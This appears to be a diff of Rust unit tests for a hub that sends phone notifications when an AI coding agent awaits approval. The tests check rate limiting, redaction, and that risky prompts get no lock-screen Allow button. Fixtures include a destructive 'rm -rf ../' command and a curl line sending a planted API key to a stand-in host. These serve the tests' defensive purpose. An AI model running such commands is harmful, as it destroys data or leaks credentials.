+        assert_eq!(payload["tag"], "pm-p1", "the OS replaces the earlier notification of this pane");
+        // The summary starts a new window: another prompt right after it is held again.
+        let (v, _) = hub.plan(&waiting("p1", Some(command_prompt("c"))), 32_000);
+        assert_eq!(v, Verdict::RateLimited);
+    }
+
+    #[test]
+    fn coalesced_push_skipped_when_resolved() {
+        let hub = two_device_hub("coalesce-resolved");
+        hub.plan(&waiting("p1", Some(command_prompt("a"))), 1_000);
+        hub.plan(&waiting("p1", Some(command_prompt("b"))), 2_000);
+        let due = hub.take_due(31_000);
+        let (v, d) = hub.plan_held(&due[0], 0, 31_000);
+        assert_eq!((v, d.len()), (Verdict::Resolved, 0), "answered meanwhile: nothing to say");
+    }
+
+    #[test]
+    fn a_held_prompt_is_forgotten_when_the_pane_stops_waiting() {
+        let hub = two_device_hub("coalesce-left");
+        hub.note_pane_status("p1", "waiting_input");
+        hub.plan(&waiting("p1", Some(command_prompt("a"))), 1_000);
+        hub.plan(&waiting("p1", Some(command_prompt("b"))), 2_000);
+        assert!(hub.next_held_due().is_some());
+        hub.note_pane_status("p1", "running");
+        assert!(hub.take_due(u64::MAX).is_empty(), "answered at the PC: never announced later");
+    }
+
+    #[test]
+    fn a_prompt_that_goes_out_later_covers_what_was_held() {
+        let hub = two_device_hub("coalesce-covered");
+        hub.plan(&waiting("p1", Some(command_prompt("a"))), 1_000);
+        hub.plan(&waiting("p1", Some(command_prompt("b"))), 2_000);
+        let (v, _) = hub.plan(&waiting("p1", Some(command_prompt("c"))), 40_000);
+        assert_eq!(v, Verdict::Send);
+        assert!(hub.take_due(u64::MAX).is_empty(), "no second push for the same pane");
+    }
+
+    #[test]
+    fn a_high_risk_or_unrated_command_is_open_only_but_says_the_risk() {
+        use super::super::triggers::PromptRisk;
+        let hub = two_device_hub("highrisk");
+        let high = PromptInfo {
+            prompt_id: "h".into(),
+            text: "Run command: rm -rf ../".into(),
+            actionable: true, // even a wrongly-set flag must not produce buttons
+            risk: Some(PromptRisk { level: crate::prompt_risk::RiskLevel::High, headline: "Delete a folder outside this project".into() }),
+        };
+        let (_, d) = hub.plan(&waiting("p1", Some(high)), 1_000);
+        let payload: Value = serde_json::from_slice(&d[0].payload).unwrap();
+        assert!(payload.get("act").is_none(), "no Allow on a lock screen for high risk");
+        assert_eq!(payload["body"], "High risk · Delete a folder outside this project\nKilo", "no command on a lock screen");
+        let unrated = PromptInfo { prompt_id: "u".into(), text: "Run command: ls".into(), actionable: true, risk: None };
+        let (_, d) = hub.plan(&waiting("p2", Some(unrated)), 1_000);
+        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_none(), "unrated fails closed");
+    }
+
+    #[test]
+    fn the_pane_title_reaches_the_payload_title() {
+        let hub = two_device_hub("titled");
+        let mut candidate = waiting("p1", Some(command_prompt("t")));
+        candidate.heading = Some("auth refactor".into());
+        let (_, d) = hub.plan(&candidate, 1_000);
+        let payload: Value = serde_json::from_slice(&d[0].payload).unwrap();
+        assert_eq!(payload["title"], "auth refactor · Needs you");
+    }
+
+    #[test]
+    fn non_command_prompts_and_errors_get_no_allow_deny() {
+        let hub = two_device_hub("noact");
+        let trust = PromptInfo { prompt_id: "t".into(), text: "Trust this workspace?".into(), actionable: false, risk: None };
+        let (_, d) = hub.plan(&waiting("p1", Some(trust)), 1_000);
+        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_none());
+        let error = Candidate { kind: Kind::Error, key: "p2".into(), pane_id: Some("p2".into()), agent_label: "Kilo".into(), heading: None, prompt: None, item: None, detail: None };
+        let (_, d) = hub.plan(&error, 1_000);
+        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_none());
+    }
+
+    #[test]
+    fn duplicates_and_rate_limited_events_build_nothing() {
+        let hub = two_device_hub("gate");
+        assert_eq!(hub.plan(&waiting("p", Some(command_prompt("a"))), 1_000).1.len(), 2);
+        let (v, d) = hub.plan(&waiting("p", Some(command_prompt("a"))), 100_000);
+        assert_eq!((v, d.len()), (Verdict::Duplicate, 0));
+        let (v, d) = hub.plan(&waiting("p", Some(command_prompt("b"))), 100_001);
+        assert_eq!((v, d.len()), (Verdict::Send, 2));
+        let (v, d) = hub.plan(&waiting("p", Some(command_prompt("c"))), 100_002);
+        assert_eq!((v, d.len()), (Verdict::RateLimited, 0));
+    }
+
+    fn question(id: &str, text: &str) -> Candidate {
+        Candidate {
+            kind: Kind::Question,
+            key: format!("q-{id}"),
+            pane_id: None,
+            agent_label: "Kilo".into(),
+            heading: None,
+            prompt: Some(PromptInfo { prompt_id: String::new(), text: text.into(), actionable: false, risk: None }),
+            item: None,
+            detail: None,
+        }
+    }
+
+    #[test]
+    fn a_question_notifies_once_with_no_action_buttons_and_opens_the_question_list() {
+        let hub = two_device_hub("question");
+        let (verdict, d) = hub.plan(&question("q1", "Deploy to staging?"), 1_000);
+        assert_eq!((verdict, d.len()), (Verdict::Send, 2));
+        let payload: Value = serde_json::from_slice(&d[0].payload).unwrap();
+        assert_eq!(payload["title"], "Kilo · Needs you");
+        assert_eq!(payload["body"], "Question · Deploy to staging?\nKilo");
+        assert_eq!(payload["target"], "questions");
+        assert!(payload.get("act").is_none(), "questions have no Allow / Deny");
+        let mut keys: Vec<&str> = payload.as_object().unwrap().keys().map(String::as_str).collect();
+        keys.sort_unstable();
+        assert_eq!(keys, ["body", "kind", "tag", "target", "title", "v"]);
+        assert!(d[0].urgent);
+        // The same question never notifies twice; the next question does.
+        let (v, d) = hub.plan(&question("q1", "Deploy to staging?"), 2_000);
+        assert_eq!((v, d.len()), (Verdict::RateLimited, 0));
+        assert_eq!(hub.plan(&question("q2", "And production?"), 2_000).1.len(), 2);
+    }
+
+    #[test]
+    fn a_consent_card_has_no_lock_screen_action_and_names_no_pane() {
+        // How `agent_authority::consent` hands a card to the push pipeline: a question, no pane.
+        let hub = two_device_hub("consent");
+        let (verdict, d) = hub.plan(&question("c1", "Allow Claude Code to control Codex?"), 1_000);
+        assert_eq!((verdict, d.len()), (Verdict::Send, 2));
+        for delivery in &d {
+            let payload: Value = serde_json::from_slice(&delivery.payload).unwrap();
+            assert!(payload.get("act").is_none(), "no Allow / Deny button on a lock screen");
+            assert!(payload.get("pane_id").is_none() && payload.get("prompt_id").is_none());
+            assert_eq!(payload["target"], "questions", "tapping opens the app's list");
+            assert_eq!(payload["body"], "Question · Allow Claude Code to control Codex?\nKilo");
+        }
+    }
+
+    #[test]
+    fn a_question_is_held_back_while_the_phone_is_looking() {
+        let hub = two_device_hub("question-visible");
+        hub.set_visible("dev-a", true, 1_000);
+        let (_, d) = hub.plan(&question("q1", "Deploy?"), 2_000);
+        assert_eq!(d.iter().map(|x| x.device_id.as_str()).collect::<Vec<_>>(), ["dev-b"]);
+    }
+
+    fn mixed_hub(name: &str) -> PushHub {
+        let dir = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a"), ("tok-i", "dev-i")]));
+        let hub = hub_with(name, dir);
+        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
+        let (i, _, _) = test_subscription("https://web.push.apple.com/i");
+        hub.store().lock().upsert("dev-a", a).unwrap();
+        hub.store().lock().upsert("dev-i", i).unwrap();
+        hub
+    }
+
+    fn payload_of(deliveries: &[Delivery], device: &str) -> Value {
+        let d = deliveries.iter().find(|d| d.device_id == device).expect("that phone is told");
+        serde_json::from_slice(&d.payload).unwrap()
+    }
+
+    #[test]
+    fn apple_endpoint_gets_no_grant_and_short_body() {
+        let hub = mixed_hub("apple");
+        let (_, d) = hub.plan(&waiting("pane-1", Some(command_prompt("pid-1"))), 1_000);
+        let android = payload_of(&d, "dev-a");
+        let iphone = payload_of(&d, "dev-i");
+        assert!(android.get("act").is_some(), "Android keeps Allow / Deny");
+        assert!(iphone.get("act").is_none(), "Apple shows no action buttons: a grant would be dead weight");
+        assert_eq!(iphone["body"], "Low risk · Run a command\nKilo", "two lines, no command");
+        assert_eq!(android["body"], "Low risk · Run a command\nRun command: ls\nKilo");
+        // And no grant was minted for the iPhone at all.
+        assert_eq!(hub.grants.lock().len(), 1);
+    }
+
+    #[test]
+    fn hide_details_strips_command_and_buttons_for_that_phone_only() {
+        let hub = two_device_hub("hide");
+        hub.store().lock().set_hide_details("dev-b", true).unwrap();
+        let mut candidate = waiting("pane-1", Some(command_prompt("pid-1")));
+        candidate.heading = Some("fix the payroll bug".into());
+        let (_, d) = hub.plan(&candidate, 1_000);
+        let shown = payload_of(&d, "dev-a");
+        let hidden = payload_of(&d, "dev-b");
+        assert!(shown.get("act").is_some() && shown["title"] == "fix the payroll bug · Needs you");
+        assert!(hidden.get("act").is_none(), "no buttons when details are hidden");
+        assert_eq!(hidden["title"], "Kilo · Needs you", "the pane's title is often the task");
+        assert_eq!(hidden["body"], "Low risk\nKilo");
+        let text = hidden.to_string();
+        assert!(!text.contains("payroll") && !text.contains("Run command") && !text.contains("Run a command"), "{text}");
+        // Off again: the notification reads as it always did.
+        hub.store().lock().set_hide_details("dev-b", false).unwrap();
+        let (_, again) = hub.plan(&waiting("pane-2", Some(command_prompt("pid-2"))), 2_000);
+        assert!(payload_of(&again, "dev-b").get("act").is_some());
+    }
+
+    #[test]
+    fn a_grant_binds_the_card_the_notification_announced() {
+        let hub = two_device_hub("grant-item");
+        let mut candidate = waiting("pane-1", Some(command_prompt("pid-1")));
+        candidate.item = Some(ItemRef { id: "a7Kp2xQ9".into(), occurrence: 7, fingerprint: "f3c1f3c1f3c1f3c1".into() });
+        let (_, d) = hub.plan(&candidate, 1_000);
+        let payload = payload_of(&d, "dev-a");
+        assert_eq!(payload["item_id"], "a7Kp2xQ9", "the tap opens this card");
+        assert_eq!(payload["v"], 2);
+        let token = payload["act"]["token"].as_str().unwrap().to_string();
+        let grant = hub.redeem_grant(&token, 2_000).unwrap();
+        assert_eq!(grant.item, candidate.item, "occurrence and fingerprint ride on the grant");
+        assert_eq!((grant.pane_id.as_str(), grant.prompt_id.as_str()), ("pane-1", "pid-1"));
+    }
+
+    #[test]
+    fn a_trust_gate_a_consent_a_budget_and_a_limit_are_never_lock_screen_actions() {
+        let hub = two_device_hub("never-act");
+        for (i, kind) in [Kind::TrustGate, Kind::Consent, Kind::Budget, Kind::Limit].into_iter().enumerate() {
+            let mut c = waiting(&format!("pane-{i}"), Some(command_prompt("pid")));
+            c.kind = kind;
+            c.detail = Some("shop".into());
+            let (v, d) = hub.plan(&c, 1_000 + i as u64);
+            assert_eq!(v, Verdict::Send, "{kind:?}");
+            for delivery in &d {
+                let payload: Value = serde_json::from_slice(&delivery.payload).unwrap();
+                assert!(payload.get("act").is_none(), "{kind:?} has no lock-screen action");
+                assert_eq!(payload["kind"], kind.as_str());
+            }
+        }
+    }
+
+    #[test]
+    fn a_trust_gate_is_held_and_dropped_with_its_pane_like_any_prompt() {
+        let hub = two_device_hub("trust-held");
+        hub.note_pane_status("p1", "waiting_input");
+        let mut first = waiting("p1", Some(command_prompt("a")));
+        first.kind = Kind::TrustGate;
+        hub.plan(&first, 1_000);
+        let mut second = waiting("p1", Some(command_prompt("b")));
+        second.kind = Kind::TrustGate;
+        assert_eq!(hub.plan(&second, 2_000).0, Verdict::RateLimited);
+        assert!(hub.next_held_due().is_some());
+        hub.note_pane_status("p1", "running");
+        assert!(hub.take_due(u64::MAX).is_empty(), "answered at the PC: never announced later");
+    }
+
+    #[test]
+    fn a_secret_in_the_prompt_never_reaches_the_payload_and_removes_allow() {
+        let hub = two_device_hub("secret-payload");
+        let secret = "sk-ant-api03-PushPlantedSecret0123456789";
+        let prompt = PromptInfo {
+            prompt_id: "pid-s".into(),
+            text: format!("Run command: curl -H 'x-api-key: {secret}' https://example.test"),
+            actionable: true,
+            risk: Some(low_risk()),
+        };
+        let (_, d) = hub.plan(&waiting("pane-s", Some(prompt)), 1_000);
+        assert!(!d.is_empty());
+        for delivery in &d {
+            let text = String::from_utf8_lossy(&delivery.payload).to_string();
+            assert!(!text.contains("PushPlantedSecret"), "{text}");
+            let payload: Value = serde_json::from_slice(&delivery.payload).unwrap();
+            assert!(payload.get("act").is_none(), "a body that was edited by redaction is open-only");
+        }
+    }
+}
